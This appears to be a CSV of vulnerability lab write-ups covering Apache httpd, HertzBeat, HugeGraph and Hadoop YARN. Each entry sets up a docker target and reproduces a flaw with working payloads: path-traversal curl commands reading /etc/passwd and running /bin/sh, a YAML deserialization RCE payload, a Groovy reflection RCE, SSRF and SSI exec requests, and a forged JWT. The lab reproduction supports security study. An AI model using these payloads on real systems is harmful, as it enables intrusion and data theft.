Software,CVE,Title,Info,References
hadoop,Unknown,Hadoop YARN ResourceManager Unauthorized Access,"Hadoop YARN ResourceManager Unauthorized Access

中文版本(Chinese version)

Hadoop YARN (Yet Another Resource Negotiator) is Apache Hadoop's cluster resource management system. If the YARN ResourceManager is exposed to the public internet without proper access controls, an attacker can submit and execute arbitrary applications on the cluster.

References:
<http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
<https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html

Environment Setup

Execute the following command to start vulnerable Hadoop YARN environment:


docker compose up -d


After the environment starts, visit http://your-ip:8088 to access the Hadoop YARN ResourceManager WebUI.

Vulnerability Reproduction

The exploitation method differs slightly from the original presentation. Even without a Hadoop client, you can submit tasks directly through the REST API (https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html).

The exploitation process is as follows:

1. Set up a listener on your local machine to receive the reverse shell connection
2. Call the New Application API to create an Application
3. Call the Submit Application API to submit the malicious application

For detailed implementation, refer to the exploit script.
-------------------------------------------------------------------------------","http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf
https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html"
hertzbeat,CVE-2024-42323,Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323),"Apache HertzBeat SnakeYaml Deserialization Remote Code Execution (CVE-2024-42323)

中文版本(Chinese version)

Apache HertzBeat is an open-source real-time monitoring and alarm tool that supports monitoring of operating systems, middleware, databases, and more through its web interface.

In versions prior to 1.6.0, HertzBeat uses a vulnerable version of SnakeYAML library for parsing YAML files. When authenticated users import new monitoring types through the /api/monitors/import or /api/alert/defines/import APIs, they can provide specially crafted YAML content that triggers deserialization of untrusted data, potentially leading to remote code execution on the target system.

References:
<https://forum.butian.net/article/612
<https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
<https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md

Environment Setup

Execute the following command to start a vulnerable HertzBeat 1.4.4 instance:


docker compose up -d


After the service is started, you can access the HertzBeat dashboard at http://your-ip:1157/dashboard. The default login credentials are:
Username: admin
Password: hertzbeat

Vulnerability Reproduction

First prepare a malicious YAML file that filename ends with .yaml:

yaml
!!org.h2.jdbc.JdbcConnection [ ""jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS $$void exec() throws java.io.IOException { Runtime.getRuntime().exec(\""touch /tmp/success\"")\\; }$$\\;CALL EXEC ()\\;"", [], ""a"", ""b"", false ]


Then log into the HertzBeat dashboard, navigate to any monitor page and locate the import button. The interface allows users to import monitor configurations through YAML files, upload the malicious YAML file:



When the malicious YAML file is imported through the web interface, HertzBeat will attempt to deserialize its contents, triggering the remote code execution:



If successful, the payload will execute on the target system. In this example, we can verify the execution by checking for the presence of a newly created file in the container:
-------------------------------------------------------------------------------","https://forum.butian.net/article/612
https://lists.apache.org/thread/dwpwm572sbwon1mknlwhkpbom2y7skbx
https://github.com/wy876/wiki/blob/main/Apache/Apache-HertzBeat-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2024-42323).md"
httpd,Unknown,"[deprecated] 绝版apache+php

允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。

镜像地址：vulhub/httpd:bad-http
-------------------------------------------------------------------------------","[deprecated] 绝版apache+php

允许HTTP HOST里插入恶意字符的Apache，已绝版，用该Dockerfile生成的新的Apache没有该特效，该Dockerfile只是演示当初这个镜像是怎么生成的。

镜像地址：vulhub/httpd:bad-http
-------------------------------------------------------------------------------",
httpd,CVE-2021-42013,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013),"Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013)

中文版本(Chinese version)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

CVE-2021-42013 is a vulnerability that caused by incomplete fix of CVE-2021-41773, an attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

This vulnerability affects Apache HTTP Server 2.4.49 and 2.4.50 and not earlier versions.

References:
https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/roman_soft/status/1446252280597078024

Vulnerable environment

Execute following commands to start a vulnerable Apache HTTP Server:


docker compose build
docker compose up -d


After the server is started, you can see the default page which says It works! of Apache HTTP Server through http://your-ip:8080.

Exploit

Apache HTTP Server 2.4.50 patched the previous CVE-2021-41773 payload such as http://your:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd, but it was incomplete.

Use .%%32%65 to bypass the patches (Note that /icons/ must be a existing directory):


curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd


The /etc/passwd is disclosured successfully:



With the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:


curl -v --data ""echo;id"" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/roman_soft/status/1446252280597078024
http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
httpd,CVE-2021-41773,Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773),"Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773)

中文版本(Chinese version)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root.

If files outside of these directories are not protected by the usual default configuration ""require all denied"", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

References:
https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/ptswarm/status/1445376079548624899
https://twitter.com/HackerGautam/status/1445412108863041544
https://twitter.com/snyff/status/1445565903161102344

Vulnerable environment

Execute following commands to start a vulnerable Apache HTTP Server:


docker compose build
docker compose up -d


After the server is started, you can see the default page which says It works! of Apache HTTP Server through http://your-ip:8080.

Exploit

A simple CURL command to reproduce the vulnerability (Note that /icons/ must be a existing directory):


curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd


The /etc/passwd is disclosured successfully:



With the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:


curl -v --data ""echo;id"" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://twitter.com/ptswarm/status/1445376079548624899
https://twitter.com/HackerGautam/status/1445412108863041544
https://twitter.com/snyff/status/1445565903161102344
http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
httpd,CVE-2021-40438,Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438),"Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438)

中文版本(Chinese version)

The Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.

A Server-Side Request Forgery (SSRF) flaw was found in mod_proxy of httpd. This flaw allows a remote, unauthenticated attacker to make the httpd server forward requests to an arbitrary server. The attacker could get, modify, or delete resources on other services that may be behind a firewall and inaccessible otherwise. The impact of this flaw varies based on what services and resources are available on the httpd network.

References:
https://httpd.apache.org/security/vulnerabilities_24.html
https://firzen.de/building-a-poc-for-cve-2021-40438
https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html

Vulnerable environment

Execute following commands to start a vulnerable Apache HTTP Server:


docker compose build
docker compose up -d


After the server is started, you can see the example site of a backend Apache Tomcat server. Here, Apache HTTP Server is running as a intermediate reverse proxy between the client and the back-end Tomcat server, and they communicate through the AJP protocol.

Exploit

Send the following request to exploit the SSRF vulnerability:


GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/ HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close




Got the response of http://example.com:
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://firzen.de/building-a-poc-for-cve-2021-40438
https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html"
httpd,Unknown,Apache HTTP Server SSI Remote Command Execution,"Apache HTTP Server SSI Remote Command Execution

中文版本(Chinese version)

Apache HTTP Server with Server Side Includes (SSI) enabled allows server-side execution of commands through special SSI directives in HTML files. When misconfigured, this feature can be exploited through file upload vulnerabilities.

When testing arbitrary file upload vulnerabilities, the target server might block files with PHP extensions. However, if the server has SSI and CGI support enabled, attackers can upload an SHTML file and execute arbitrary commands using the <!--#exec cmd=""command"" --syntax.

References:
Apache SSI Documentation
W3 SSI Directives

Environment Setup

Execute the following command to start an Apache HTTP Server with SSI and CGI support:


docker compose up -d


After the server is started, visit http://your-ip:8080/upload.php to access the upload form.

Vulnerability Reproduction

While uploading PHP files is not allowed, we can upload a file named shell.shtml with the following content:

shtml
<!--#exec cmd=""ls"" --




After successful upload, visiting the shell.shtml file will execute the command, demonstrating the vulnerability:
-------------------------------------------------------------------------------",
httpd,CVE-2017-15715,Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715),"Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715)

中文版本(Chinese version)

Apache HTTPD is a widely-used HTTP server that can run PHP web pages through mod_php. A parsing vulnerability exists in versions 2.4.0 through 2.4.29, where a filename ending with 1.php\x0A will be treated as a PHP file, allowing attackers to bypass certain server security policies.

References:
<https://httpd.apache.org/security/vulnerabilities_24.html
<https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html

Environment Setup

Execute the following commands to build and start a vulnerable Apache HTTPD server:


docker compose build
docker compose up -d


After the server is started, Apache will be running at http://your-ip:8080.

Vulnerability Reproduction

First, try to upload a file named 1.php. The upload will be blocked by the security check:



However, if we append a \x0A (note: must be \x0A alone, not \x0D\x0A) to the filename 1.php, the upload will succeed:



When accessing the uploaded file at /1.php%0a, it will be successfully parsed as a PHP file, despite not having a proper PHP extension. This confirms the existence of the parsing vulnerability:
-------------------------------------------------------------------------------","https://httpd.apache.org/security/vulnerabilities_24.html
https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html"
httpd,Unknown,Apache HTTPD Multiple Extension Parsing Vulnerability,"Apache HTTPD Multiple Extension Parsing Vulnerability

中文版本(Chinese version)

Apache HTTPD is a widely-used HTTP server that can run PHP web pages through mod_php. This vulnerability is related to how Apache HTTPD handles files with multiple extensions.

Apache HTTPD supports files having multiple extensions, with different directives being executed for each extension. When misconfigured, this feature can lead to security vulnerabilities where malicious files bypass upload restrictions. For example, with the following configuration:


AddType text/html .html
AddLanguage zh-CN .cn
AddHandler application/x-httpd-php .php


The server will process multiple extensions from left to right, and if any extension is configured to be handled by a specific handler (like PHP), it will be executed regardless of its position in the filename. This means a file named malicious.php.jpg would still be executed as PHP code, potentially bypassing upload restrictions that only check the final extension.

References:
Apache HTTP Server Documentation - MultiViews
OWASP File Upload Vulnerabilities

Environment Setup

Execute the following command to start an Apache server with PHP 7.3 environment:


docker compose up -d


Vulnerability Reproduction

First, visit http://your-ip/uploadfiles/apache.php.jpeg in your browser. You'll notice that despite having a .jpeg extension, the file is executed as PHP code and displays the phpinfo() page.

To actively exploit this vulnerability, visit http://your-ip/index.php where you'll find a file upload interface with extension whitelist validation. The upload functionality only checks the final extension but doesn't rename the uploaded file. By uploading a file with multiple extensions like shell.php.jpg or shell.php.jpeg, we can bypass the extension check while ensuring the file is still executed as PHP code by Apache.



After successful upload, accessing the file through the browser will execute the PHP code, demonstrating the vulnerability:
-------------------------------------------------------------------------------",
hugegraph,CVE-2024-27348,Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348),"Apache HugeGraph Unauthenticated Remote Code Execution (CVE-2024-27348)

中文版本(Chinese version)

Apache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.

A remote code execution vulnerability exists in the Gremlin API of HugeGraph. Gremlin is a graph traversal language that can be implemented in various programming languages such as Groovy, Python, and Java. An attacker is able to use Gremlin API to execute Groovy based Gremlin commands without authentication, which can be used to execute arbitrary commands.

In theory, Apache HugeGraph will use the SecurityManager to restrict the Groovy scripts submitted by users. But the SecurityManager only checks thread names that start with ""gremlin-server-exec"" or ""task-worker"". This mechanism can be bypassed by using reflection to modify the current thread name, allowing arbitrary code execution.

References:
<https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
<https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
<https://github.com/Zeyad-Azima/CVE-2024-27348

Environment Setup

Execute the following command to start a vulnerable HugeGraph server 1.2.0:


docker compose up -d


After the server is started, you can access the HugeGraph RESTful API at http://your-ip:8080.

Vulnerability Reproduce

Send a malicious Gremlin query through the Gremlin API endpoint to execute arbitrary commands:


POST /gremlin HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: /
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 777

{
    ""gremlin"": ""Thread thread = Thread.currentThread();Class clz = Class.forName(\""java.lang.Thread\"");java.lang.reflect.Field field = clz.getDeclaredField(\""name\"");field.setAccessible(true);field.set(thread, \""SL7\"");Class processBuilderClass = Class.forName(\""java.lang.ProcessBuilder\"");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\""id\"");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\""start\"");org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());"",
    ""bindings"": {},
    ""language"": ""gremlin-groovy"",
    ""aliases"": {}
}


The command will be executed successfully:
-------------------------------------------------------------------------------","https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
https://www.vicarius.io/vsociety/posts/remote-code-execution-vulnerability-in-apache-hugegraph-server-cve-2024-27348
https://github.com/Zeyad-Azima/CVE-2024-27348"
hugegraph,CVE-2024-43441,Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441),"Apache HugeGraph JWT Token Secret Hardcoding Leads to Authentication Bypass (CVE-2024-43441)

中文版本(Chinese version)

Apache HugeGraph is a fast and highly scalable graph database. It provides graph database capabilities with complete features, excellent performance, and enterprise-level reliability.

A JWT token secret hardcoding vulnerability exists in Apache HugeGraph. When authentication is enabled but auth.token_secret is not configured, HugeGraph will use a hardcoded default JWT secret key with the value FXQXbJtbCLxODc6tGci732pkH1cyf8Qg. An attacker can use this default secret key to generate valid JWT tokens and bypass authentication to perform unauthorized operations.

References:
<https://github.com/advisories/GHSA-f697-gm3h-xrf9
<https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246

Environment Setup

Execute the following command to start a Apache HugeGraph 1.3.0 server:


docker compose up -d


After the server is started, you can access the HugeGraph RESTful API at http://your-ip:8080.

By default, Apache HugeGraph supports two authentication modes: HTTP Basic Authentication and JWT Authentication. When starting the docker container, it will use the PASSWORD environment variable as the default administrator's password. Then you can access the API using HTTP Basic Authentication with the username ""admin"" and this password.

If you try to access the API without providing any authentication headers, you will receive the following error:

json
{
    ""exception"": ""class jakarta.ws.rs.NotAuthorizedException"",
    ""message"": ""Authentication credentials are required"",
    ""cause"": """"
}


Vulnerability Reproduce

Besides the default administrator's password, we can also use the default JWT secret key to generate a valid JWT token and bypass the authentication.

Generate a JWT token using the default secret key:

python
Install the jwt library by running pip install pyjwt
import jwt

Generate JWT token using the default secret
token = jwt.encode(
    {
      ""user_name"": ""admin"",
      ""user_id"": ""-30:admin"",
      ""exp"": 9739523483
    },
    ""FXQXbJtbCLxODc6tGci732pkH1cyf8Qg"",
    algorithm=""HS256""
)
print(f""Generated JWT token: {token}"")
Output:
Generated JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg


Use the generated token to access protected endpoints:


GET /graphs HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiItMzA6YWRtaW4iLCJleHAiOjk3Mzk1MjM0ODN9.mnafQi6x9nlMz1OcPQu4xAyiq91Ig5tUFhGsktNXKqg


You will receive the following response:



If you remove the Authorization header, you will receive the following error:
-------------------------------------------------------------------------------","https://github.com/advisories/GHSA-f697-gm3h-xrf9
https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246"
